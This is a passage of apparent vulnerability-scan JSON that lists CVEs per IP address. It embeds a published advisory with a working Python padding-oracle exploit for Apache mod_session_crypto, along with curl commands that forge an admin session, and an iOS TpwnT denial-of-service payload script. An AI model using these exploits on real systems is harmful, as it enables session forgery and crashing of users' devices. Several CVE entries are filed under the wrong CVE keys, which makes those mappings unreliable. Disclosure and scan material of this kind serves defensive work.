then made available to the application in an\r\nenvironment variable (in case of a CGI script) or in a custom HTTP\r\nrequest header. The application can add a custom HTTP response header\r\n(usually \"X-Replace-Session\") which instructs the HTTP server to replace\r\nthe session's content with the value of the header. Detailed\r\ninstructions to set up mod_session and mod_session_crypto can be found\r\nin the documentation:\r\nhttps://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples\r\n\r\nThe module mod_session_crypto is configured to use either 3DES or AES\r\nwith various key sizes, defaulting to AES256. Encryption is handled by\r\nthe function \"encrypt_string\":\r\n\r\nmodules/session/mod_session_crypto.c\r\n------------------------------------------------------------------------\r\n/**\r\n * Encrypt the string given as per the current config.\r\n *\r\n * Returns APR_SUCCESS if successful.\r\n */\r\nstatic apr_status_t encrypt_string(request_rec * r, const apr_crypto_t *f,\r\n        session_crypto_dir_conf *dconf, const char *in, char **out)\r\n{\r\n[...]\r\n    apr_crypto_key_t *key = NULL;\r\n[...]\r\n    const unsigned char *iv = NULL;\r\n[...]\r\n\r\n    /* use a uuid as a salt value, and prepend it to our result */\r\n    apr_uuid_get(&salt);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_passphrase(&key, &ivSize, passphrase,\r\n            strlen(passphrase),\r\n            (unsigned char *) (&salt), sizeof(apr_uuid_t),\r\n            *cipher, APR_MODE_CBC, 1, 4096, f, r->pool);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_block_encrypt_init(&block, &iv, key, &blockSize, r->pool);\r\n[...]\r\n    res = apr_crypto_block_encrypt(&encrypt, &encryptlen, (unsigned char *)in,\r\n            strlen(in), block);\r\n[...]\r\n    res = apr_crypto_block_encrypt_finish(encrypt + encryptlen, &tlen, block);\r\n[...]\r\n\r\n    /* prepend the salt and the iv to the result */\r\n    combined = apr_palloc(r->pool, ivSize + encryptlen + sizeof(apr_uuid_t));\r\n    memcpy(combined, &salt, sizeof(apr_uuid_t));\r\n    memcpy(combined + sizeof(apr_uuid_t), iv, ivSize);\r\n    memcpy(combined + sizeof(apr_uuid_t) + ivSize, encrypt, encryptlen);\r\n\r\n    /* base64 encode the result */\r\n    base64 = apr_palloc(r->pool, apr_base64_encode_len(ivSize + encryptlen +\r\n                    sizeof(apr_uuid_t) + 1)\r\n            * sizeof(char));\r\n[...]\r\n    return res;\r\n}\r\n------------------------------------------------------------------------\r\n\r\nThe source code shows that an encryption key is derived from the\r\nconfigured password and a randomly chosen salt by calling the function\r\n\"apr_crypto_passphrase\". This function internally uses PBKDF2 to derive\r\nthe key. The data is then encrypted and the salt and IV prepended to the\r\nencrypted data. Before returning to the caller, the result is encoded as\r\nbase64.\r\n\r\nThis procedure does not guarantee integrity of the ciphertext, so the\r\nApache module is unable to detect whether a session sent back to the\r\nserver has been tampered with. Depending on the application this often\r\nmeans that attackers are able to exploit a Padding Oracle vulnerability.\r\nThis allows decrypting the session and encrypting arbitrary data chosen\r\nby the attacker.\r\n\r\n\r\nProof of Concept\r\n================\r\n\r\nThe vulnerability can be reproduced as follows. First, the modules\r\nmod_session, mod_session_crypto and mod_session_cookie are enabled and\r\nconfigured:\r\n\r\n------------------------------------------------------------------------\r\nSession On\r\nSessionEnv On\r\nSessionCookieName session path=/\r\nSessionHeader X-Replace-Session\r\nSessionCryptoPassphrase RedTeam\r\n------------------------------------------------------------------------\r\n\r\nIn addition, CGI scripts are enabled for a folder and the following CGI\r\nscript is saved as \"status.rb\" and is made available to clients:\r\n\r\n------------------------------------------------------------------------\r\n#!/usr/bin/env ruby\r\n\r\nrequire 'cgi'\r\n\r\ncgi = CGI.new\r\ndata = CGI.parse(ENV['HTTP_SESSION'])\r\n\r\nif data.has_key? 'username'\r\n        puts\r\n        puts \"your username is %s\" % data['username']\r\n        exit\r\nend\r\n\r\nputs \"X-Replace-Session: username=guest&timestamp=\" + Time.now.strftime(\"%s\")\r\nputs\r\nputs \"not logged in\"\r\n------------------------------------------------------------------------\r\n\r\nOnce the CGI script is correctly set up, the command-line HTTP client curl\r\ncan be used to access it:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -i http://127.0.0.1:8080/cgi-bin/status.rb\r\nHTTP/1.1 200 OK\r\nDate: Tue, 19 Jan 2016 13:23:19 GMT\r\nServer: Apache/2.4.10 (Ubuntu)\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nCache-Control: no-cache\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-ruby\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThe example shows that a new encrypted cookie with the name \"session\" is\r\nreturned, and the response body contains the text \"not logged in\".\r\nCalling the script again with the cookie just returned reveals that the\r\nusername in the session is set to \"guest\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is guest\r\n------------------------------------------------------------------------\r\n\r\nSending a modified cookie ending in \"u=\" instead of \"U=\" will invalidate\r\nthe padding at the end of the ciphertext, so the session cannot be\r\ndecrypted correctly and is therefore not passed to the CGI script, which\r\nreturns the text \"not logged in\" again:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRu= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThis verifies the existence of the Padding Oracle vulnerability. The\r\nPython library[1] python-paddingoracle was then used to implement\r\ndecrypting the session by exploiting the Padding Oracle vulnerability.\r\n\r\nexploit.py\r\n------------------------------------------------------------------------\r\n'''\r\n\r\nfrom paddingoracle import BadPaddingException, PaddingOracle\r\nfrom base64 import b64encode, b64decode\r\nimport requests\r\n\r\nclass PadBuster(PaddingOracle):\r\n    def __init__(self, valid_cookie, **kwargs):\r\n        super(PadBuster, self).__init__(**kwargs)\r\n        self.wait = kwargs.get('wait', 2.0)\r\n        self.valid_cookie = valid_cookie\r\n\r\n    def oracle(self, data, **kwargs):\r\n        v = b64encode(self.valid_cookie+data)\r\n\r\n        response = requests.get('http://127.0.0.1:8080/cgi-bin/status.rb',\r\n                cookies=dict(session=v), stream=False, timeout=5, verify=False)\r\n\r\n        if 'username' in response.content:\r\n            logging.debug('No padding exception raised on %r', v)\r\n            return\r\n\r\n        raise BadPaddingException\r\n\r\nif __name__ == '__main__':\r\n    import logging\r\n    import sys\r\n\r\n    if not sys.argv[2:]:\r\n        print 'Usage: [encrypt|decrypt] <session value> <plaintext>'\r\n        sys.exit(1)\r\n\r\n    logging.basicConfig(level=logging.WARN)\r\n    mode = sys.argv[1]\r\n    session = b64decode(sys.argv[2])\r\n    padbuster = PadBuster(session)\r\n\r\n    if mode == \"decrypt\":\r\n        cookie = padbuster.decrypt(session[32:], block_size=16, iv=session[16:32])\r\n        print('Decrypted session:\\n%r' % cookie)\r\n    elif mode == \"encrypt\":\r\n        key = session[0:16]\r\n        plaintext = sys.argv[3]\r\n\r\n        s = padbuster.encrypt(plaintext, block_size=16)\r\n\r\n        data = b64encode(key+s[0:len(s)-16])\r\n        print('Encrypted session:\\n%s' % data)\r\n    else:\r\n        print \"invalid mode\"\r\n        sys.exit(1)\r\n\r\n'''\r\n------------------------------------------------------------------------\r\n\r\nThis Python script can then be used to decrypt the session:\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py decrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=\r\nDecrypted session:\r\nb'username=guest&timestamp=1453282205\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r'\r\n\r\nreal    6m43.088s\r\nuser    0m15.464s\r\nsys 0m0.976s\r\n------------------------------------------------------------------------\r\n\r\nIn this sample application, the username and a timestamp are included in\r\nthe session data. The Python script can also be used to encrypt a new\r\nsession containing the username \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py encrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYB\\\r\nRU= username=admin\r\n\r\nEncrypted session:\r\nsxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7zmQ/GLFjF4pcXY\r\n\r\nreal3m38.002s\r\nusers0m8.536s\r\nsys0m0.512s\r\n\r\n------------------------------------------------------------------------\r\n\r\nSending this newly encrypted session to the server shows that the\r\nusername is now \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7\\\r\nzmQ/GLFjF4pcXY http://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is admin\r\n------------------------------------------------------------------------\r\n\r\n\r\nWorkaround\r\n==========\r\n\r\nUse a different means to store the session, e.g. in a database by using\r\nmod_session_dbd.\r\n\r\n\r\nFix\r\n===\r\n\r\nUpdate to Apache HTTP version 2.4.25 (see [2]).\r\n\r\n\r\nSecurity Risk\r\n=============\r\n\r\nApplications which use mod_session_crypto usually store sensitive values\r\nin the session and rely on an attacker's inability to decrypt or modify\r\nthe session. Successful exploitation of the Padding Oracle vulnerability\r\nsubverts this mechanism and allows to construct sessions with arbitrary\r\nattacker-specified content. Depending on the application this may\r\ncompletely subvert the application's security. Therefore, this\r\nvulnerability poses a high risk.\r\n\r\n\r\nTimeline\r\n========\r\n\r\n2016-01-11 Vulnerability identified\r\n2016-01-12 Customer approved disclosure to vendor\r\n2016-01-12 CVE number requested\r\n2016-01-20 Vendor notified\r\n2016-01-22 Vendor confirmed the vulnerability\r\n2016-02-03 Vendor provided patch\r\n2016-02-04 Apache Security Team assigned CVE number\r\n2016-03-03 Requested status update from vendor, no response\r\n2016-05-02 Requested status update from vendor, no response\r\n2016-07-14 Requested status update and roadmap from vendor\r\n2016-07-21 Vendor confirms working on a new released and inquired whether the\r\n           patch fixes the vulnerability\r\n2016-07-22 RedTeam confirms\r\n2016-08-24 Requested status update from vendor\r\n2016-08-29 Vendor states that there is no concrete timeline\r\n2016-12-05 Vendor announces a release\r\n2016-12-20 Vendor released fixed version\r\n2016-12-23 Advisory released\r\n\r\n\r\nReferences\r\n==========\r\n\r\n[1] https://github.com/mwielgoszewski/python-paddingoracle\r\n[2] http://httpd.apache.org/security/vulnerabilities_24.html\r\n\r\n\r\nRedTeam Pentesting GmbH\r\n=======================\r\n\r\nRedTeam Pentesting offers individual penetration tests performed by a\r\nteam of specialised IT-security experts. Hereby, security weaknesses in\r\ncompany networks or products are uncovered and can be fixed immediately.\r\n\r\nAs there are only few experts in this field, RedTeam Pentesting wants to\r\nshare its knowledge and enhance the public knowledge with research in\r\nsecurity-related areas. The results are made available as public\r\nsecurity advisories.\r\n\r\nMore information about RedTeam Pentesting can be found at:\r\nhttps://www.redteam-pentesting.de/\r\n'''",
                "description": "Apache mod_session_crypto - Padding Oracle",
                "author": "RedTeam Pentesting GmbH",
                "_id": 40961,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2016-12-23T00:00:00+00:00",
                "cve": [
                    "CVE-2016-0736"
                ],
                "type": "webapps",
                "port": 0
            }
        ],
        "CVE-2014-3583": [
            {
                "source": "CVE",
                "_id": "2014-3583",
                "description": "The handle_headers function in mod_proxy_fcgi.c in the mod_proxy_fcgi module in the Apache HTTP Server 2.4.10 allows remote FastCGI servers to cause a denial of service (buffer over-read and daemon crash) via long response headers.",
                "osvdb": [],
                "bid": [
                    71657
                ],
                "cve": [
                    "CVE-2014-3583"
                ],
                "msb": []
            }
        ],
        "CVE-2015-3185": [
            {
                "source": "CVE",
                "_id": "2015-3185",
                "description": "The ap_some_auth_required function in server/request.c in the Apache HTTP Server 2.4.x before 2.4.14 does not consider that a Require directive may be associated with an authorization setting rather than an authentication setting, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by leveraging the presence of a module that relies on the 2.2 API behavior.",
                "osvdb": [],
                "bid": [
                    75965
                ],
                "cve": [
                    "CVE-2015-3185"
                ],
                "msb": []
            }
        ],
        "CVE-2015-3184": [
            {
                "source": "CVE",
                "_id": "2015-3184",
                "description": "mod_authz_svn in Apache Subversion 1.7.x before 1.7.21 and 1.8.x before 1.8.14, when using Apache httpd 2.4.x, does not properly restrict anonymous access, which allows remote anonymous users to read hidden files via the path name.",
                "osvdb": [],
                "bid": [
                    76274
                ],
                "cve": [
                    "CVE-2015-3184"
                ],
                "msb": []
            }
        ],
        "CVE-2018-1312": [
            {
                "source": "CVE",
                "_id": "2018-1312",
                "description": "In Apache httpd 2.2.0 to 2.4.29, when generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection.",
                "osvdb": [],
                "bid": [
                    103524
                ],
                "cve": [
                    "CVE-2018-1312"
                ],
                "msb": []
            }
        ],
        "CVE-2016-8612": [
            {
                "source": "CVE",
                "_id": "2016-8612",
                "description": "Apache HTTP Server mod_cluster before version httpd 2.4.23 is vulnerable to an Improper Input Validation in the protocol parsing logic in the load balancer resulting in a Segmentation Fault in the serving httpd process.",
                "osvdb": [],
                "bid": [
                    94939
                ],
                "cve": [
                    "CVE-2016-8612"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-8612",
                "description": "A Denial Of Service vulnerability exists when Connected User Experiences and Telemetry Service fails to validate certain function values, aka \"Connected User Experiences and Telemetry Service Denial of Service Vulnerability.\" This affects Windows Server 2016, Windows 10, Windows Server 2019, Windows 10 Servers.",
                "osvdb": [],
                "bid": [
                    106087
                ],
                "cve": [
                    "CVE-2018-8612"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15710": [
            {
                "source": "CVE",
                "_id": "2017-15710",
                "description": "In Apache httpd 2.0.23 to 2.0.65, 2.2.0 to 2.2.34, and 2.4.0 to 2.4.29, mod_authnz_ldap, if configured with AuthLDAPCharsetConfig, uses the Accept-Language header value to lookup the right charset encoding when verifying the user's credentials. If the header value is not present in the charset conversion table, a fallback mechanism is used to truncate it to a two characters value to allow a quick retry (for example, 'en-US' is truncated to 'en'). A header value of less than two characters forces an out of bound write of one NUL byte to a memory location that is not part of the string. In the worst case, quite unlikely, the process would crash which could be used as a Denial of Service attack. In the more likely case, this memory is already reserved for future use and the issue has no effect at all.",
                "osvdb": [],
                "bid": [
                    103512
                ],
                "cve": [
                    "CVE-2017-15710"
                ],
                "msb": []
            }
        ]
    },
    "152.1.31.68": {},
    "152.1.31.87": {
        "CVE-2017-7679": [
            {
                "source": "CVE",
                "_id": "2017-7679",
                "description": "In Apache httpd 2.2.x before 2.2.33 and 2.4.x before 2.4.26, mod_mime can read one byte past the end of a buffer when sending a malicious Content-Type response header.",
                "osvdb": [],
                "bid": [
                    99170
                ],
                "cve": [
                    "CVE-2017-7679"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: TpwnT - iOS Denail of Service POC\r\n# Date: 10-31-2017\r\n# Exploit Author: Russian Otter (Ro)\r\n# Vendor Homepage: https://support.apple.com/en-us/HT208222\r\n# Version: 2.1\r\n# Tested on: iOS 10.3.2 - 11.1\r\n# CVE: CVE-2017-13849\r\n\r\n\"\"\"\r\n-------------------------\r\n     CVE-2017-13849\r\n  TpwnT by Ro of SavSec\r\n-------------------------\r\n\r\nDescription:\r\n\tThread Pwning Text (TpwnT) is maliciously crafted text that affects the iPhone and other Apple devices by exploiting a vulnerability found in the Core-Text firmware which results in a thread crash or extreme application lag!\r\n\r\nRecorded Tests / Results:\r\n\tSignal version 2.14.1 on iOS 10.3.2 (fixed on 2.15.3) users were able to crash conversations by sending the payload which would result in the app crashing when the selected chat was opened.\r\n\t\r\n\tInstagram version 10.25 (fixed on 10.31) on iOS 10.3.2 and resulting in chat thread crashes when the payload was sent which disallowed users to load chat or send messages. When the payload was unsent the chat was fuctional.\r\n\t\r\n\tPythonista 3 on iOS 10.3.2, crashed when displaying multiple sets of TpwnT or while rotating the device.\r\n\t\r\nSummary:\r\n\tWhen displaying the TpwnT Characters on iOS < 11.1 the iPhone may lag intensely or crash on certain apps!\r\n\tThis allows for the possibility of DoS related attacks or application crashing attacks.\r\n\r\nCreator: @Russian_Otter (Ro)\r\nDiscovery: 7-17-2017\r\nDisclosure: 10-31-2017\r\nDisclosure Page: https://support.apple.com/en-us/HT208222\r\n\r\nAffected Devices\r\n\tiPhone 5S iOS < 11.1\r\n\tiPhone 6 & 6S iOS < 11.1\r\n\tiPhone 7 iOS < 11.1\r\n\tiPhone 8 iOS < 11.1\r\n\tiPhone X iOS < 11.1\r\n\tApple TV 4th Generation\r\n\tApple TV 4K 4th Generation\r\n\tiPod Touch 6th Generation\r\n\tiPad Air\r\n\twatchOS < 4.1\r\n\ttvOS < 11.1\r\n\tiOS < 11.1\r\n\r\nTested Devices:\r\n\tiPhone 5S iOS 10.3.2 - 11.1\r\n\tiPhone 6S iOS 10.3.1 - 11.1\r\n\tiPad Mini 2 iOS 10.3.2\r\n\tApple TV 2 tvOS 10\r\n\r\nTested Apps:\r\n\tSignal\r\n\tInstagram\r\n\tSnapchat\r\n\tSafari\r\n\tTanktastic\r\n\tPythonista 3\r\n\tNotepad\r\n\r\n\"\"\"\r\n\r\ntpwnt = \"880 881 883 887 888 975 1159 1275 1276 1277 1278 1302 1304 1305 1306 1311 1313 1314 1316 1317 1318 1319 1322 1323 1324 1325 1326 1327 1328 1543 2304 2405 3073 3559 3585 3586 4091 4183 4184 4353 6366 6798 7679 7680 7837 7930 7932 7933 7934 7935 7936 8343 8344 8345 8346 8347 8348 8349 8376 8381 8382 8383 8384 8524 9136 9169 10215 10216 11153 11374 11377 11381 11390 11392 11746 11747 11748 11749 11750 11751 11752 11753 11754 11755 11756 11757 11758 11759 11760 11761 11762 11763 11764 11765 11766 11767 11768 11769 11771 11772 11773 11774 11775 11776 11811 11813 11814 12295 12344 12357 12686 19971 19975 42560 42562 42563 42564 42565 42566 42567 42568 42569 42570 42571 42572 42573 42574 42575 42576 42577 42578 42579 42580 42581 42583 42584 42585 42587 42588 42589 42590 42591 42592 42594 42595 42596 42597 42598 42599 42600 42601 42602 42603 42604 42605 42606 42608 42609 42610 42611 42612 42613 42614 42615 42616 42617 42619 42620 42621 42622 42623 42624 42625 42627 42628 42629 42630 42632 42633 42634\".split()\r\n\r\npayload = \"\"\r\nfor i in tpwnt:\r\n\ts = unichr(int(i))\r\n\tpayload += s\r\n\r\npayload = bytes(payload)\r\npayload_unicode = unicode(payload)\r\n\r\n# Proof of Concept\r\n# iOS < 11.1 Devices that display these characters should experience lag or crashes while TpwnT is visible\r\n\r\nif raw_input(\"Show Payload [y/n] \") == \"y\":\r\n\tprint payload_unicode",
                "description": "iOS < 11.1 / tvOS < 11.1 / watchOS < 4.1 - Denial of Service",
                "author": "Russian Otter",
                "_id": 43161,
                "source": "ExploitDB",
                "platform": "ios",
                "date": "2017-11-20T00:00:00+00:00",
                "cve": [
                    "CVE-2017-13849"
                ],
                "type": "dos",
                "port": 0
            }
        ]
    },
    "152.1.31.89": {},
    "152.1.38.83": {
        "CVE-2014-2532": [
            {
                "source": "CVE",
                "_id": "2014-2532",
                "description": "sshd in OpenSSH before 6.6 does not properly support wildcards on AcceptEnv lines in sshd_config, which allows remote attackers to bypass intended environment restrictions by using a substring located before a wildcard character.",
                "osvdb": [],
                "bid": [
                    66355
                ],
                "cve": [
                    "CVE-2014-2532"
                ],
                "msb": []
            }
        ],
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ],
        "CVE-2013-4548": [
            {
                "source": "CVE",
                "_id": "2013-4548",
                "description": "The mm_newkeys_from_blob function in monitor_wrap.c in sshd in OpenSSH 6.2 and 6.3, when an AES-GCM cipher is used, does not properly initialize memory for a MAC context data structure, which allows remote authenticated users to bypass intended ForceCommand and login-shell restrictions via packet data that provides a crafted callback address.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2013-4548"
                ],
                "msb": []
            }
        ],
        "CVE-2016-0778": [
            {
                "source": "CVE",
                "_id": "2016-0778",
                "description": "The (1) roaming_read and (2) roaming_write functions in roaming_common.c in the client in OpenSSH 5.x, 6.x, and 7.x before 7.1p2, when certain proxy and forward options are enabled, do not properly maintain connection file descriptors, which allows remote servers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact by requesting many forwardings.",
                "osvdb": [],
                "bid": [
                    80698
                ],
                "cve": [
                    "CVE-2016-0778"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0758",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102405
                ],
                "cve": [
                    "CVE-2018-0758"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0777",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102402
                ],
                "cve": [
                    "CVE-2018-0777"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0770",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102397
                ],
                "cve": [
                    "CVE-2018-0770"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0769",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102396
                ],
                "cve": [
                    "CVE-2018-0769"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0776",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102401
                ],
                "cve": [
                    "CVE-2018-0776"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0781",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, and CVE-2018-0778.",
                "osvdb": [],
                "bid": [
                    102404
                ],
                "cve": [
                    "CVE-2018-0781"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0772",
                "description": "Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 and R2 SP1, Windows 8.1 and Windows RT 8.1, Windows Server 2012 and R2, and Internet Explorer and Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102409
                ],
                "cve": [
                    "CVE-2018-0772"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0762",
                "description": "Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 and R2 SP1, Windows 8.1 and Windows RT 8.1, Windows Server 2012 and R2, and Internet Explorer and Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102408
                ],
                "cve": [
                    "CVE-2018-0762"
                ],
                "msb": []
            }
        ],
        "CVE-2016-10708": [
            {
                "source": "CVE",
                "_id": "2016-10708",
                "description": "sshd in OpenSSH before 7.4 allows remote attackers to cause a denial of service (NULL pointer dereference and daemon crash) via an out-of-sequence NEWKEYS message, as demonstrated by Honggfuzz, related to kex.c and packet.c.",
                "osvdb": [],
                "bid": [
                    102780
                ],
                "cve": [
                    "CVE-2016-10708"
                ],
                "msb": []
            }
        ],
        "CVE-2016-0777": [
            {
                "source": "CVE",
                "_id": "2016-10119",
                "description": "Firejail uses 0777 permissions when mounting /tmp, which allows local users to gain privileges.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2016-10119"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2016-10120",
                "description": "Firejail uses 0777 permissions when mounting (1) /dev, (2) /dev/shm, (3) /var/tmp, or (4) /var/lock, which allows local users to gain privileges.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2016-10120"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2016-0777",
                "description": "The resend_bytes function in roaming_common.c in the client in OpenSSH 5.x, 6.x, and 7.x before 7.1p2 allows remote servers to obtain sensitive information from process memory by requesting transmission of an entire buffer, as demonstrated by reading a private key.",
                "osvdb": [],
                "bid": [
                    80695
                ],
                "cve": [
                    "CVE-2016-0777"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2016-8605",
                "description": "The mkdir procedure of GNU Guile temporarily changed the process' umask to zero. During that time window, in a multithreaded application, other threads could end up creating files with insecure permissions. For example, mkdir without the optional mode argument would create directories as 0777. This is fixed in Guile 2.0.13. Prior versions are affected.",
                "osvdb": [],
                "bid": [
                    93510
                ],
                "cve": [
                    "CVE-2016-8605"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0770",
